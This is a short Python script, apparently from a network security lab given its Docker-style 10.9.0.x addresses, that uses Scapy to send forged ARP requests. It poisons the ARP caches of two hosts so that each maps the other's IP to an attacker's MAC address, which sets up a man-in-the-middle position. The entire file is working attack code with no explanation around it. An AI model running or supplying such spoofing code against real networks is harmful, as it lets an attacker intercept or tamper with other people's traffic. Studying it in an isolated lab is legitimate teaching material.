from scapy.all import *
m_mac = '02:42:0a:09:00:69'
m_ip = '10.9.0.105'
a_mac = '02:42:0a:09:00:05'
a_ip = '10.9.0.5'
b_ip = '10.9.0.6'

E = Ether()
A = ARP()
A.op = 1
A.hwsrc = m_mac
A.psrc = b_ip
A.hwdst = a_mac
A.pdst = a_ip
E.src = m_mac
E.dst = a_mac
pkt = E/A
sendp(pkt)

###########################
A.op = 1
A.hwsrc = m_mac
A.psrc = a_ip
A.hwdst = '02:42:0a:09:00:06'
A.pdst = b_ip
E.src = m_mac
E.dst = '02:42:0a:09:00:06'
pkt = E/A
sendp(pkt)
